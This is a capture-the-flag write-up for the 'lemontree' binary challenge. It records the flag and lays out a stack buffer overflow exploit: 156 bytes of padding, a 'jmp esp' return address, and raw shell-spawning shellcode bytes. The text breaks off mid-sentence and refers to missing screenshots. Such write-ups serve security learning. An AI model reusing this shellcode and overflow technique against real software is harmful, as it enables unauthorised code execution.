# Flag

> Hacking-Arena{Just_a_yellow_lemon_tree}

# Prompt

> I wonder how, I wonder why you cannot solve this binary.

> nc koala2.hackingarena.no 805 nc koala.hackingarena.com 805 (same binary)

# Solution

Determine the necessary size of padding for the attached binary.

gdb ./lemontree

Run binary file and attempt to crash when output equals "... , But nothing ever".

![[Pasted image 20241115171527.png]]

Padding is equal to 156, so I proceed by finding the return address of the binary file (jmp esp)

Edit template.py to match padding of 156
![[Pasted image 20241115172120.png]]

![[Pasted image 20241115172244.png]]

Run template.py and debug using GDB, then search and find 'jmp esp'

![[Pasted image 20241115172508.png]]

Run template.py, debug and search for 'jmp esp' using pwndbg:

search --asm 'jmp esp'

![[Pasted image 20241115172555.png]]

Add a payload for template.py:
payload+= p32(0x8049243)

Edit template.py and include 'jmp esp' as a payload.

![[Pasted image 20241115172716.png]]

Add another payload, the same payload from the strawberry CTF.
payload+='\x99\x52\x58\x52\xbf\xb7\x97\x39\x34\x01\xff\x57\xbf\x97\x17\xb1\x34\x01\xff\x47\x57\x89\xe3\x52\x53\x89\xe1\xb0\x63\x2c\x58\x81\xef\x62\xae\x61\x69\x57\xff\xd4'

Additionally, add the payload used in Straw

# Additional Info

Additional solution / info